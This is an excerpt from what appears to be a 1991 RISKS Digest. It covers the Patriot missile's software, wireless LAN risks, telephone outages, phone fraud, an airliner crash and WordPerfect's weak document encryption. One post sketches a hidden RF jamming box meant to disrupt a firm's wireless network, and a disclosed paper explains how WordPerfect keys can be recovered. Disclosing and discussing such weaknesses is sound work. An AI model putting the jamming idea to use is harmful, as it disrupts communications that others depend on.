and software.

Summary: No Way

&gt; The [Patriot] system was contracted for 15 years ago by the Redstone
&gt; Arsenal.  It was initially to be an anti-aircraft missile, and it still
&gt; is, but about four years ago, unspecified software upgrades on the ground
&gt; equipment and hardware upgrades on the missile's detonation fuze were
&gt; made so that the system willa also be able to destroy tactical missiles,
&gt; such as the Russian Scud.

&gt; Various news organizations have alluded to or asserted outright that the
&gt; upgrades are technologies developed under the Strategic Defense
&gt; Initiative program.  "That is bull!  There is no 'Star Wars' hardware or
&gt; software in Patriot," [Redstone Arsenal public affairs officer David]
&gt; Harris said.  "There has been no 'Star Wars' funding of Patriot.  This is
&gt; all Army."  He said the SDI Organization is planning to provide $40
&gt; million for continuing development of the Patriot's advanced seeker
&gt; (nose-cone radar), but it has not been received by the Army yet.

This from "Portrait of a Patriot" by Brian Santo.  Unfortunately I have no idea
where this appeared; the clipping was posted in our coffee room this AM and I
have been unable to run down the source!  However, the technical content is
high and consistent, so I am inclined to believe that the foregoing is a true
reflection of the [US Army Missile Command's version of the] history of the
Patriot.

The article *does* assert that "[t]he missile itself has its own radar. .
.which kicks in as it nears its target," but the description of operation is
otherwise consistent with Henry Spencer's recent posting (RISKS DIGEST 10.85):

&gt; Even Patriot's homing is actually controlled by the ground computers; the
&gt; missile itself has no brains to speak of, just a receiver system that
&gt; picks up radar reflections off the target and relays them to the ground
&gt; for assessment

so possibly a passive radar was meant but not explicitly stated.  On the other
hand, if SDIO sees an application it seems more likely that the Track Via
Missile (TVM) radar is active, not passive.

Finally, in the same message Henry remarks

&gt; I've never understood why it is fundamentally impossible to put "man in
&gt; the loop" for space-based systems.  I'd be interested in seeing this
&gt; explained. There is clearly a serious shortage of time for
&gt; decision-making, but the same is true of terminal defence against
&gt; tactical missiles -- which have much shorter flight times than ICBMs --
&gt; and short-notice decision-making in combat is both possible and
&gt; practical, as any fighter pilot can testify.

I'd say alertness.  Crews, even highly-trained fighter pilots, need time to
come up to combat-readiness from standby.  Note that in the current case of
"terminal defence against tactical missiles" (Santo again)

&gt; [t]he detection and firing sequence is entirely automatic, and the only
&gt; intervention required of a human operator is to stop the Patriot from
&gt; firing.

This kind of tripwire arrangement looks unacceptable, at least for boost phase.
I suppose one could quibble over the the use of the word "fundamentally," but
*I* wouldn't want to have to design a robust system of this type.

Henry writes:
&gt; The recent incident of an accidental launch against

&gt; reportedly was in antimissile mode and thus probably wasn't
&gt; expecting evasive action.

It would seem that this mistake exhibited a flaw in the antimissile software
design, though further details are needed for confirmation.  Namely, there was
no effective software check of observed radar track for ballistic trajectory.
A launch against returning planes should have been precluded by a simple
trajectory test.

&gt; *I* wouldn't want to have to design a robust system of this type.

The question, of course, is whether one can design a better system
without humans involved, where "better" includes not just probability
of functioning well when desired but probability of functioning when
not desired.  If you compare fallible, inattentive humans against the
Pentagon's imaginary perfect computers, then of course you conclude
that the man-in-the-loop system is inferior.  Against real computers
running real software, I'm not so sure.

&gt; the risk for spectral chaos seems to be quite high.  Imagine the RFI

Interference will only be had by devices operating on the same frequencies.  If
the networking system is given its own band of frequences it won't interfere
with cellular phones any more than FM radio does.

There are other risks to this scheme, though.  Ethernet is based on a collision
detection scheme.  If two nodes send out a message at the same time they detect
the collision (because the data is scrambled) and then wait a random amount of
time before retrying the send.  It would be relatively simple to build a small
box which would output a short burst of RF every few milliseconds.  The more
often this box "squawked" the more collisions it would create on the network
and the slower the network would get.  Generate these pulses often enough and
you could bring the entire network to a halt.  The box would certainly be able
to operate for several days powered from a normal nine volt battery, and would
be small enough to hide easily.

Now what if several major financial firms relied on wireless networks in their
office and I decided that I wanted to create a little chaos and impede their
ability to respond on the morning of a large takeover bid?  Simply drop by for
a "visit" and toss one of these boxes in a nearby garbage can.

I'm not familiar with Apple's proposal, but I am very pleased with Motorola's
WIN (Wireless In-building Network) proposal.

WIN is to use 10 MHz channels within the 18-19 GHz band, and this has some very
special propagation characteristics.  Each "microcell" network can ignore
another network's use of the same channel, 120 or 200 feet away - less if a
concrete floor or wall intervenes. (Unlike infrared, 18 GHz can pass through
drywall and partitions.)

The system uses "low power" (I don't have a number).  It also uses a fair bit
of multiplexing and packetizing, with source/destination pairs changing at 1
MHz. But best of all, 18 GHz reflects off walls, causing a considerable
multipath problem (ie multiple out-of-phase copies of the signal).  Some very
clever design was required to allow in-cell reception at all: things should be
pretty well incoherent, a very small distance away. WIN is probably as secure
as the office suite it's in.

-&gt;Reading the notices about the approach of broadcast LAN's reminded me of a
-&gt;semihumorous incident that happened about 2 years while I was doing some
-&gt;consulting for a "local" oil company.  ...

-&gt;All of the remote telemetry units were communicating with the
-&gt;master station computer via low power Johnson radios, and I had made sure that
-&gt;we had dummy loads on all of the antennae so as to cut down the range of the
-&gt;transmissions.  This screwed up SWR's and about everything else, 

    Dummy loads are designed not to screw up the SWR's. They are a
perfect match, unless you are using the wrong dummy loads. Somehow, in
this case, that wouldn't surprise me. But I quote this section as
anecdotal evidence that the system was not licensed for data
communications work. 

-&gt;Sporadically, we would get bursts of errors for seemingly no reason, and then
-&gt;good comm again for a while.  ...

-&gt;Much to my surprise, I heard
-&gt;some poor fella in a delivery truck complain about "there's that doggone
-&gt;buzzing sound again" to his dispatcher at the same time that our comm
-&gt;efficiency dropped to zero!

   This is quite humorous. Ha. And quite lucky that you were not
using radios that just happened to be tuned to the hospital or other
emergency frequency. But you were probably saved by using radios that
were licensed for business band voice communications, so all you screwed
up were all the other users of that frequency.

-&gt;It was kinda fun listening to all of those guys swear at the strange 
-&gt;interference that they were getting.

   Yes, many sick people DO find it quite a hoot to cause deliberate
interference to licensed users of the spectrum (and the moment you
identified the source of the interference to YOU, you became deliberate
interference to the pizza service). I don't think the FCC feels like it
is a fun game. They tend to levy fines on people for doing it.

Two responses to points raised by some recent messages on this issue:

	1.  Ian Clements is concerned about possible effects on medical
		devices such as implanted heart monitoring devices.  All
		thing are possible, but there are already TONS of transmit-
		ters out there.  This is hardly a new or poorly understood
		problem.  However, note that a broadcast LAN, designed to work
		over a 150 foot radius, is likely to use much lower power than
		a cellular telephone, which must work over many miles.

	2.  Rich Rosenbaum comments that some of these technologies use
		spread-spectrum techniques, hence may be inherently secure.
		Well, yes and no - but mainly no.  There are several different
		spread-spectrum techniques, but let's take a simple one,
		frequency hoping.  In this technique, we select a broad
		channel - say 100Mhz wide.  We consider it to be subdivided
		into 100 1Mhz-wide slots.  Traditionally, we then parcel those
		slots out to 100 users.  In frequency hoping, we instead
		send signals on ALL the bands.  Each "channel" corresponds to
		a sequence of slots spread over the entire channel.  The
		sender hops through its sequence at a rapid rate - say, it
		switches every millisecond.  The receiver follows the same
		sequence of slots, synchronized with the sender.  A receiver
		that follows some other sequence has only a one in a hundred
		chance of intercepting the signal at any given time.  So a
		receiver listening on a a "channel" receives very little junk
		from any given unrelated channel.  It's possible to choose a
		large number (&gt;&gt; 100) of different "channels" (sequences) such
		that any subset of, say, 20 transmitting hardly interfere.
		This means that you can have many more than 100 users on the
		channel, who can almost always get through (unless too many
		want to do so at once).

		Now, if you don't know the particular sequence the sender is
		using, you have a hard time reading his message.  In fact,
		it's not even easy to tell that he's sending!  The acronyms in
		use to describe this stuff include LPD/LPI/LPE (Low Probabili-
		ty of Detection (enemy can't even tell you are there)/Inter-
		cept (enemy knows you are sending but can't extract any signi-
		ficant features of the message)/Exploitation (even if the
		enemy can "read" your signal, he can't tell what it means)).
		The flip side of this is AJ, Anti-Jam (i.e., jam-resistant).

		However, keeping the sequences secret complicates the system.
		It's much simpler to use fixed, pre-assigned, publically known
		sequences.  What's traded off is the protection the modulation
		technique COULD provide.  In the case of a broadcast LAN, LPD
		and LPI are of little importance; what you care about is LPE.
		If you were to use strong, secret sequences, you'd get those -
		but the hardware needed (which must generate a cryptographic-
		ally strong sequence of slot numbers) is comparable to the
		hardware you'd need to do encryption, and you'd still have to
		add all sorts of stuff to complete the system:  You can use
		the same key safely on a lot of different messages, but you
		can never safely re-use a hop sequence (so there's a whole
		synchronization problem to solve).

I was East for a week, culminating in my COMPASS '91 Risk-of-the-Year talk at
NIST on failures (both correlated and independent) that resulted in
far-reaching problems, including the recent telephone cable cuts and switching
problems.  On the way back across the Cabin John Bridge toward Dulles Airport
on Wednesday (having experienced enormous traffic delays in the opposite
direction on Monday night due to construction), I heard the report of the
7-state east-coast phone slowage plus the simultaneous but presumed independent
L.A. problem, both attributed to Switching System 7 protocol implementations.
(See below.)  From the airport Wednesday, I tried a bunch of calls that would
not go through.  Having returned home, it is clear that from a RISKS point of
view this was a bad time to have been away (there were over 250 messages
awaiting me in the RISKS directory alone).  

This issue is the first to try to catch up with the backlog in hopes of not
generating the exponentially increasing backlog in response.  We will as usual
favor exciting new business, and go very slow on nth-order incrementals.  I
will also jack up the relevance razor ('n' Occam Dead?).  

Some of the items in this issue will be "old hat" to those of you who are avid
media mavens, but they are included anyway for archival purposes... and have
been greatly foreshortened by the PGN Abstracting Service.

   In San Diego, the former General Dynamics Corp. computer programmer, Michael
John Lauffenburger, was arrested for allegedly planting a ``logic bomb,'' a
type of virus that would have destroyed vital rocket project data.
Lauffenburger's goal, according to a federal indictment, was to get rehired as
a high-priced consultant to fix the damage he created. He quit May 29.
   A fellow General Dynamics worker defused the plot by accidentally stumbling
onto the logic bomb. Lauffenburger was charged with computer tampering and
attempted computer fraud.  If convicted, he faces up to 10 years in prison and
a $500,000 fine. He pleaded innocent and was released on $10,000 bail.

Excerpts from an article headlined PHONE OUTAGES SHOW HAZARDS OF NEW TECHNOLOGY
by Jonathan Weber in the 28 June 1991 `Los Angeles Times':

"The massive telephone failures in the Los Angeles and Washington areas earlier
this week stemmed from glitches in ... a specialized computer network that
shuttles information about calls between telephone company switching
offices.... The inherent complexity of an increasingly software-based phone
system ... raises the prospect that the public telephone service may be
inherently less reliable in the future than it has been in the past.  Pacific
Bell said Thursday that it had suspended further deployment of ...  Signaling
System 7 until the exact cause of the problem could be identified.  It appeared
... that the [LA and Washington] problems ... were not identical, but both
[were] attributed to breakdowns [in the] SS-7 equipment supplied by DSC
Communications of Dallas."

  [Explanations of expected benefits from the SS-7, including improved
  efficiency, capacity, speed, security, and new service possibilities such as
  "the controversial Caller ID."]

"The flip side of all this ... is that if the SS-7 system malfunctions, it
begins sending incorrect information all over the network.  Ross Ireland,
general manager for network services at Pacific Bell, said Wednsday's incident
was caused by a signaling system unit in downtown Los Angeles that inexplicably
began sending out a flurry of wrong information about problems in the network,
and ultimately shut itself down.  Then there was a cascade effect, in which the
other signaling system units began acting on the incorrect information.
Finally, when people tried to make calls and couldn't, they kept trying, which
created an abnormally high level of calling traffic and thus further
exacerbated the problem.

"Because a phone network is so tightly integrated -- akin to one big computer
-- it's very hard to locate and fix problems...."

[See also `Los Angeles Times,' John Kendall and Paul Lieberman, 27 June 1991:
"By coincidence, service also was disrupted to 6.7 million telephone customers
Wednesday in the District of Columbia, Maryland, Virginia, and parts of West
Virginia.... [T]he trouble began in Baltimore during a routine modification of
equipment procedure." [sic]]

    [Officials at Chesapeake and Potomac said the problems were probably
    unrelated. Asked if hackers could have caused the problems, Ellen
    Fitzgerald, a spokeswoman for Chesapeake and Potomac, said she she had been
    assured that the system could not be penetrated.  [!!!] But, she added, ``a
    few days ago I would have told you that what happened yesterday wouldn't
    happen.''

    Terry Adams, a spokesman at the DSC Communications Corp., which made both
    systems, said company officials also discounted any connection between the
    failures.  {From the NY Times article, 28 Jun 91.  PGN}]

[...] May we be seeing here a situation in which market pressures to implement
a complex new protocol is affecting design and test cycles for switching
software?

According to the WSJ, the equipment and software in question are made by DSC
Communications Co.  The new protocol supports all those new services we hear so
much about, such as caller ID, return call, call trace and various new business
services.  It's interesting to note that the January 1990 disruption in the
AT&amp;T network, involving an implementation of the same protocol, involved
different (AT&amp;T) hardware (4ESS) and software.

According to an AP story carried in the 18 June '91 `New York Times',
Mitsubishi is suing AT&amp;T over a pbx system that was broken into by hackers who
made thousands of illegal calls worldwide.

Mitsubishi contends that AT&amp;T's System 85 Private Branch Exchange is not secure
and that AT&amp;T failed to warn Mitsubishi of the potential for unauthorized use.
Mitsubishi seeks $10 million in punitive damages and a dismissal of $430,000
billed for 30,000 phone calls which Mitsubishi attributes to unauthorized
users.

The pbx system, installed in 1988 and disconnected last year, permitted
Mitsubishi employees to make calls on the company lines no matter where they
were by using a 6-digit personal password.  According to Mitsubishi, AT&amp;T
failed to diagnose the problem, and it was New York Telephone which finally
told Mitsubishi of the possibility of system crackers.

Andrew Myers of AT&amp;T declined to comment on the suit but said that under
federal communications law, "customers are clearly responsible for both
authorized and unauthorized service."

The old sell-illegal-calls-at-a-discount scam has reemerged in Elmhurst,
Queens, NY.  High-tech mobile phone booths (cars) are very popular there, and
draw crowds of people standing in lines to make their calls, often to Colombia
or Peru.  Each car has a doctored cellular phone chip containing an ID
illegally set to some poor sap's valid ID.  "The swindle has become so popular
that legal cellular phone users in the area can rarely get access to an
available phone line."  Law-enforcement officials say that many of the calls
are made to high-level drug dealers in Colombia.  Many of the numbers dialed
from Elmhurst match up with Colombian phone numbers that investigators have on
file with the Federal Drug Enforcement Administration.

Metro One in Paramus, N.J., one of the two cellular carriers for New York City,
estimated that it has lost more than $1 million a month from illegal calls
transmitted from Elmhurst.  Nationwide, such fraudulent calls cost the cellular
phone industry about $700 million in 1990, according to Donald Delaney, an
investigator for the NY state police. Industry officials put the figure much
lower, at $100 million.  [Source: Cars Using Rigged Cellular Phones Sell

Boeing skipped essential test on Lauda crash jet        By Mark Zeller, Paris

The Lauda Air 767 that crashed in Thailand last month was granted an
airworthiness certificate without vital tests being carried out, the US Federal
Aviation Authority has admitted.  The FAA's administrator said that the
aircraft's thrust reversers - which have been blamed for the crash - were only
tested at low air speed with the engine set to idle because Boeing convinced
the FAA that safety systems would prevent their accidental deployment in
flight.

Examination of the wreckage and the pilot's cockpit voice recorder have [sic]
now shown that one of the thrust reversers - used to slow an aircraft after
landing - failed to lock in place when the plane was gaining height and
accidentally shifted to a high-power setting, causing the plane to turn so
rapidly that the tail was torn off the aircraft.  

Under the FAA's rules, all jet aircraft which use the thrusters must be tested
to ensure that accidental deployment would not cause the plane to crash.  But
the FAA's administrator, James Busey, in Paris for Le Bourget air show, said
last week that the plane had not undergone a realistic in-flight test of the
thrust reversers, which were designed and manufactured by Boeing and fitted to
Pratt &amp; Whitney engines. He disclosed that Boeing told the FAA that the plane's
sophisticated flight control computers made an accidental inflight [sic]
deployment of the thrust reversers impossible. The plane, owned by former
Austrian racing driver Nikki Lauda, was en route from Bangkok to Vienna when it
crashed in a Thai jungle three weeks ago, killing all 233 on board.

P&amp;W confirmed that if the reverse thruster had not locked properly there would
have been an indicator light advising the pilots. This warning light was heard
[sic] being discussed by the pilots on the cockpit recorder shortly before the
crash. Reading instructions from the Boeing manual, they took no action and
continued to ascend. Seconds before the crash, the co-pilot shouted that a
thrust reverser had been activated.

The tape concludes with a series of warning sirens, alarms, a snapping sound
and then a bang. The wreckage of the plane was found in dense jungle in
Thailand with one engine's thrust reverser deployed. The tail section was found
several kilometres away. Asked about the possibility of an accidental
deployment of a thrust reverser, Boeing spokesman Dick Kenny said: "It can't
happen."

But a P&amp;W representative, who wished to remain anonymous, said it was possible.

According to the engine-maker, Boeing was only now carrying out exercises to
find out what would happen if the reverse thruster deployed at high power.
Boeing has refused to comment on these tests. Before the crash, there had
already been at least one incident involving partial in-flight deployment of a
thrust reverser on a Boeing 767. There have also been several similar incidents
on 747s, but none of these led to a crash.

Lauda Air disaster linked to potentially hazardous cargo 

   London, 23 June 1991 (dpa) - A potentially hazardous cargo may have
contributed to the engine thrust reversal which caused a Lauda Air Boeing 767
to crash in Thailand May 26, killing all 223 people aboard, according to a
British report Sunday.  The Sunday Times, citing aviation safety experts, said
the Austrian plane was carrying a shipment of cheap Chinese-made watches in a
cargo hold, and that lithium batteries in one or more of the watches could have
discharged, resulting in heat and possibly fire.  Fire in the cargo hold could
have affected computer wiring, causing the plane's port engine to shift into
reverse thrust in mid-air.  The cockpit's in-flight voice recorder, and
inspections of the wreckage, showed that the engine inexplicably went into
reverse, creating aerodynamic stresses which pulled the aircraft apart.
   The wreckage also showed evidence of burn marks in one cargo hold, a
phenomenon which specialists initially were unable to explain but later linked
to the watch batteries, the report said.
   The Sunday Times said speculation about the potentially dangerous batteries
has already prompted several major airlines to slap a ban on such shipments
from Hong Kong.
   The report claimed that a South African Airways Boeing 747 was carrying a
cargo of lithium-battery watches when it crashed into the Indian Ocean on a
flight from Taiwan to South African in 1987, killing 159 people.  Last year, a
Cathay Pacific plane was forced to make an emergency landing after fire broke
out in a cargo hold bearing a shipment of watches with lithium batteries, it
said.

There's been a lot of discussion of the safety of fly-by-wire aircraft, so
here's the discussion of an accident that very possibly would have been
prevented were the DC-10 fly-by-wire rather than hydraulic.

On July 18, 1989, while in cruise at 37,000 feet, United Airlines Flight 232
suffered an uncontained engine failure of the #2 engine.  This ultimately
disabled all three hydraulic systems, thus rendering the aircraft all but
uncontrollable.  The flight crew were able to guide the aircraft to Sioux City
Gateway Airport by using a technique of "differential thrust." Approximately
fifty feet above the ground, they lost control, which, when combined with a
high descent rate, resulted in a violent crash.  Of the 296 people on board,
184 survived.  This included the flight crew.

On May 24, 1991, the captain of the airplane, Al Haynes, gave a speech on the
crash to a gathering at NASA's Dryden Flight Research Facility.  It was
primarily concerned with the mechanics of controlling the aircraft, as well as
disaster preparedness.  The speech was recorded on video tape, and, with the
consent of Al Haynes, has been made available to the net community via a
somewhat ad hoc distribution system.

The folks at Thinking Machines have provided what is (so far as I can tell) a
complete archive of RISKS for access by users of the Wide-Area Information
Server technology, on their public-access Connection Machine WAIS server.  I
have been fiddling with this for a few days now, and I think it's extremely
useful.  For example, I can ask about "Clifford Stoll Wily Hacker" and it will
come back with

263	2K	(01/12/89) :   Name this book  -- for a box of cookies!
^^^     ^^      ^^^^^^^^^^ ^^^^^^^^^^^^
Score   Size    Date       Headline

among others; I can then retrieve the *individual articles* from the server,
save them on the local disk if I want, and much more!  The server is only
available from 9 to 9 ET, but it works really well, and is amazingly
fast--there's more time spent on my end setting up question files and
garbage-collecting in Emacs than during the actual search.

Anyway, I thought you might want to mention this in the masthead...  The
"source description file" is called "risks-digest.src" and is available from
quake.think.com:

Here's one about a class A dummy...  You'd think he'd be a bit more careful
on something like this.

Probably the most dramatic instance of recovery of "deleted" file information
appears in a recent ruling of the Pennsylvania Supreme Court, Com. v.
Copenhefer, 587 A.2d 1353.  The defendant's death sentence was affirmed on
"overwhelming" circumstantial evidence, including "incredibly comprehensive"
evidence seized from the defendant's home pursuant to search warrants.
 
The computer evidence consisted of drafts of texts of phone calls, ransom and
hidden notes, and a 22 point plan for the kidnapping scheme, which eventuated
in murder of a bank manager's wife.  (The defendant was a bookstore owner who
had "unproductive transactions" with the bank).
 
The defendant argued that the computer evidence should have been suppressed
because he had deleted the files, thereby creating an "expectation of privacy"
under _Katz_ and its progeny.  The court's opinion contains a readable
explanation of how the deletion only affected the directory, and "subsequent
usage never displaced the files in question and they remained in the memory of
his computer."
 
The court soundly, and IMO correctly, rejected this claim, analogizing the
retrieval of the deleted file data (by an FBI agent who was a computer expert)
to deciphering a coded message in a diary, after the diary was obtained under a
valid subpoena.
 
Somehow, I don't think Mr. Copenhefer will be doing any endorsements for
PCTools or another defragmenter; "if only I had used Compress with the Clear
option, I wouldn't be on death row now." Among other things, the old-fashioned
physical evidence was quite overwhelming.  But the case is a striking example
of the law adjusting to computer technology.

Sort of unbelievable, especially the part about an FBI computer expert (maybe
they borrowed someone from the NSA?), but true!  So remember, Norton WIPEDISK
is your friend.

     There has been some tendancy here to treat the Patriot system "failure" to
intercept the El Hussein missile in Dharan as a poor system specification or as
badly designed software.  This is totally wrong.  If someone had gone to the
Army before the Gulf War and asked, "In this hypothetical situation...how
should the system respond?"  The answer would have been to do as it did.

     The "problems" in the software were bugs only AFTER it was known IN
PRACTICE that 1) there were missiles in that speed range that could and should
be attacked, 2) the Patriot systems' primary mission would NOT be defending
against hostile aircraft, and 3) that "highly motivated" and experienced crews
could successfully engage such missiles in "manual" mode using information from
other sites.  Given those circumstances updating the software and getting it to
the field in a matter of days was a heroic effort, even if it arrived one day
too late.

     The real risk here is in assuming that the "fog of war" is a myth.  You
don't know how systems will be used in practice until you have actual combat
experience.  I have seen many "field mods" to hardware incorporated into later
production models because the feature was needed to use the system to best
effect in combat.  This is NOT a failure of design or specification or
production, it is often the result of someone trying something because he is
dead anyway if it doesn't work.  Such successful tactics quickly become the
normal way the weapon is used.

     A simple example is dive brakes, which were initially installed on P-38s
after many crashed from incompressability problems.  In combat, the only
advantage that the P-38 had in some situations over its opponent was the
ability to dive faster, so pilots took it to the limit and beyond.  The dive
brake was invented to "fix" a problem which only occurred when a pilot stayed
in a steep dive at full power too long.  (Actually, there was a "known fix" by
the time the brakes were available--fly an outside loop!) If dive brakes had
existed when the plane was designed the designers would have been told to leave
them off.  No reason to add weigth to the plane, and no sane pilot would do
something like that anyway...  Of course, after experence in combat, pilots
would carry as much weight as possible, and try to use it to save their lives.

About half the US soldiers killed in the Dharan Scud attack belonged to a unit
stationed outside of Pittsburgh.  Recently, the local news has been reporting
that a Pittsburgh area law firm is recruiting the families of the deceased to
participate in a class action lawsuit against Raytheon, manufacturers of the
Patriot missile defense system.

Considering that the system was being operated out of spec, to solve a
different difficult problem (defense of a city) than the one it was designed
for (point defense), this incident suggests that writing software may be
RISKier than we thought...

A file on the SIMTEL20 archives, PD:&lt;MSDOS.INFO&gt;UNCRYPT.ZIP, gives information
on how to break files that a WP user has "locked" with a password, in WP lingo.
Here are some excerpts pertinent to RISKS.

From: gnu@hoptoad.uucp (John Gilmore)
Newsgroups: comp.os.msdos.apps,sci.crypt
Subject: Word Perfect "locked document encryption" is trivial to break
Date: 27 Aug 90 22:58:27 GMT
Organization: Cygnus Support, Palo Alto

One thing that came up at Crypto '90 was a short paper from Ms. Helen Bergen at
Queensland U. in Australia.  She noticed the 'locked document' commands in Word
Perfect, used by all the secretaries in her dept., and looked to see how strong
it was.  It turned out that the MSDOS DEBUG command and an envelope for scratch
paper are enough for anyone to decode both a document AND the key used for it!
Word Perfect Corp. didn't care about her results (letter reproduced below), but
I thought that some Word Perfect losers, I mean users, here on the net might
want to know.

You should consider WP locked documents like ROT13: fine to keep the text
garbled until you type a command, useless for keeping things private.

Dear John,

   Here is the letter and a copy of the Latex source of my paper. It
will be published in CRYPTOLOGIA in the near future. Thanks for your
interest,

Quote from letter received from WordPerfect Pacific:

Thankyou for the copy of your paper entitled "File Security in WordPerfect
5.0". I sent a copy of the paper to WordPerfect Corporation in the USA and
recently received a reply from them.

They confirmed that people have written programs to break the password.
However, WordPerfect Corporation does not have such a program and therefore has
no way of breaking it. They also pointed out that very few users would know how
to write such a program.

It is possible that the manual may be amended in a future edition to clarify
the protection that a password gives. They recommend that anyone concerned
about security may want to take higher precautions than the password
protection.

Thank you for your interest in WordPerfect.

ABSTRACT: Cryptanalysis of files encrypted with the 'locked document'
option of the word processing package WordPerfect V5.0, is shown to be
remarkably simple.  The encryption key and the plaintext are easily
recovered in a ciphertext only attack. File security is thus
compromised and is not in accord with the claim by the manufacturer
that: "If you forget the password, there is absolutely no way to
retrieve the document".

KEYWORDS: Cryptanalysis, WordPerfect.

INTRODUCTION

WordPerfect is one of the most popular word processing packages in use today.
It has a 'locked document' option which aims at protection of a WordPerfect
file from unauthorised access. The manual states "You can protect or lock your
documents with a password so that no one will be able to retrieve or print the
file without knowing the password - not even you".  The manual also claims that
"If you forget the password, there is absolutely no way to retrieve the
document" [1].

[detailed explanation omitted]

In the 4.2 version, the only text encrypted was that contained in the actual
document. This is unknown plaintext. In version 5.0, however, the printer
information as well as the document text is encrypted.  We have identified
bytes 16 - 21, 24 - 27, 29 - 41, 43 - 45 as being constant for a particular
system (as defined earlier, a particular licenced copy of WordPerfect on a
particular PC and printer), and they do not change markedly from one system to
another.

So we have the ideal situation of known plaintext for a reasonable number of
bytes.  This can greatly simplify our attack as it makes it possible to recover
the actual key. Then it is trivial to recover the plaintext by using
WordPerfect to retrieve the file using the recovered key as the ''password''.
Alternatively, a program could be written to do this as the
encryption/decryption algorithm is known.  We outline a strategy with the
following example from one particular system:

[detailed explanation of finding the key omitted]

  *  Retrieve the plaintext using WordPerfect with the
key as the password. This is the easiest way to decrypt
the document text.

  *  If no access to WordPerfect is available, then it is
straightforward to recover the plaintext with a short C
program which implements the decryption algorithm as described
previously. This has been done successfully.

CONCLUSION

The encryption key is easily recovered in an apparent KNOWN CIPHERTEXT ONLY
attack, as the system provides enough known plaintext in the printer
information regardless of the document plaintext.  The analysis, as shown, can
literally be done on the back of a (large) envelope.

The analysis may be slightly more difficult where the physical system on which
the files were prepared is completely unknown and vastly different to any
system we have encountered, as this may reduce the amount of known plaintext.
In these situations, statistical analysis based on the characteristic
frequencies of characters in a language is used to decipher text files.  This
is a standard method which is straightforward although a program may have to be
written.

In summary, the cryptanalysis of files encrypted with the 'locked document'
option in WordPerfect version 5.0 is remarkably simple.  The inclusion of
portions of known plaintext in the encrypted file is a fatal flaw in the
system, since it provides a mechanism of attack in which the key can be
recovered by hand, and document plaintext easily retrieved.  All of the key can
easily be recovered for keylengths of 1-13 and 15-17, far in excess of commonly
used passwords of 8 characters.  A high proportion of the key can be deduced
for keylengths of 14 and 18-24.  The cipher used is too weak, providing little
or no protection.

If the attacker has knowledge of any other unencrypted file from the same
system, the analysis is made even more simple.  We stress that **both the key
and the plaintext can be recovered**, independent of the content of the
plaintext.

The worst problem is that it may give a false sense of security. For example,
an attacker may decrypt a document, modify it and re-encrypt so that the
originator is unaware of the alterations.  We conclude that the file security
is not consistent with claims made by the manufacturer and is not sufficent to
protect sensitive documents from anything but the most naive attack.

The Electronic Frontier Foundation, Computer Professionals for Social
Responsibility, and RSA Data Security Inc. cosponsored a meeting of
cryptographers, civil libertarians, business leaders, and people from
all over the government who handle cryptography and privacy issues.
The following statement was released at the meeting.

	STATEMENT IN SUPPORT OF COMMUNICATIONS PRIVACY
			Washington, DC
			 June 10, 1991

	As representatives of leading computer and telecommunications
companies, as members of national privacy and civil liberties organizations, as
academics and researchers across the country, as computer users, as corporate
users of computer networks, and as individuals interested in the protection of
privacy and the promotion of liberty, we have joined together for the purpose
of recommending that the United States government undertake a new approach to
support communications privacy and to promote the availability of
privacy-enhancing technologies.  We believe that our effort will strengthen
economic competitiveness, encourage technological innovation, and ensure that
communications privacy will be carried forward into the next decade.

	In the past several months we have become aware that the federal
government has failed to take advantage of opportunities to promote
communications privacy.  In some areas, it has considered proposals that would
actually be a step backward.  The area of cryptography is a prime example.

	Cryptography is the process of translating a communication into a code
so that it can be understood only by the person who prepares the message and
the person who is intended to receive the message.  In the communications
world, it is the technological equivalent of the seal on an envelope.  In the
security world, it is like a lock on a door.  Cryptography also helps to ensure
the authenticity of messages and promotes new forms of business in electronic
environments.  Cryptography makes possible the secure exchange of information
through complex computer networks, and helps to prevent fraud and industrial
espionage.

	For many years, the United States has sought to restrict the use of
encryption technology, expressing concern that such restrictions were necessary
for national security purposes.  For the most part, computer systems were used
by large organizations and military contractors.  Computer policy was largely
determined by the Department of Defense.  Companies that tried to develop new
encryption products confronted export control licensing, funding restrictions,
and classification review.  Little attention was paid to the importance of
communications privacy for the general public.

	It is clear that our national needs are changing.  Computers are
ubiquitous.  We also rely on communication networks to exchange messages daily.
The national telephone system is in fact a large computer network.

	We have opportunities to reconsider and redirect our current policy on
cryptography.  Regrettably, our government has failed to move thus far in a
direction that would make the benefits of cryptography available to a wider
public.

	In late May, representatives of the State Department met in Europe with
the leaders of the Committee for Multilateral Export Controls ("COCOM").  At
the urging of the National Security Agency, our delegates blocked efforts to
relax restrictions on cryptography and telecommunications technology, despite
dramatic changes in Eastern Europe.  Instead of focusing on specific national
security needs, our delegates continued a blanket opposition to secure network
communication technologies.

	While the State Department opposed efforts to promote technology
overseas, the Department of Justice sought to restrict its use in the United
States. A proposal was put forward by the Justice Department that would require
telecommunications providers and manufacturers to redesign their services and
products with weakened security.  In effect, the proposal would have made
communications networks less well protected so that the government could obtain
access to all telephone communications.  A Senate Committee Task Force Report
on Privacy and Technology established by Senator Patrick Leahy noted that this
proposal could undermine communications privacy.

	The public opposition to S. 266 was far-reaching.  Many individuals
wrote to Senator Biden and expressed their concern that cryptographic equipment
and standards should not be designed to include a "trapdoor" to facilitate
government eavesdropping.  Designing in such trapdoors, they noted, is no more
appropriate than giving the government the combination to every safe and a
master key to every lock.

	We are pleased that the provision in S. 266 regarding government
surveillance was withdrawn.  We look forward to Senator Leahy's hearing on
cryptography and communications privacy later this year.  At the same time, we
are aware that proposals like S. 266 may reemerge and that we will need to
continue to oppose such efforts.  We also hope that the export control issue
will be revisited and the State Department will take advantage of the recent
changes in East-West relations and relax the restrictions on cryptography and
network communications technology.

	We believe that the government should promote communications privacy.
We therefore recommend that the following steps be taken.

	First, proposals regarding cryptography should be moved beyond the
domain of the intelligence and national security community.  Today, we are
growing increasingly dependent on computer communications.  Policies regarding
the appropriate use of cryptography should be subject to public review and
public debate.

	Second, any proposal to facilitate government eavesdropping should be
critically reviewed.  Asking manufacturers and service providers to make their
services less secure will ultimately undermine efforts to strengthen
communications privacy across the country.  While these proposals may be based
on sound concerns, there are less invasive ways to pursue legitimate government
goals.

	Third, government agencies with appropriate expertise should work free
of NSA influence to promote the availability of cryptography so as to ensure
communications privacy for the general public.  The National Academy of Science
has recently completed two important studies on export controls and computer
security.  The Academy should now undertake a study specifically on the use of
cryptography and communications privacy, and should also evaluate current
obstacles to the widespread adoption of cryptographic protection.

	Fourth, the export control restrictions for computer network technology
and cryptography should be substantially relaxed.  The cost of export control
restrictions are enormous.  Moreover, foreign companies are often able to
obtain these products from other sources. And one result of export restrictions
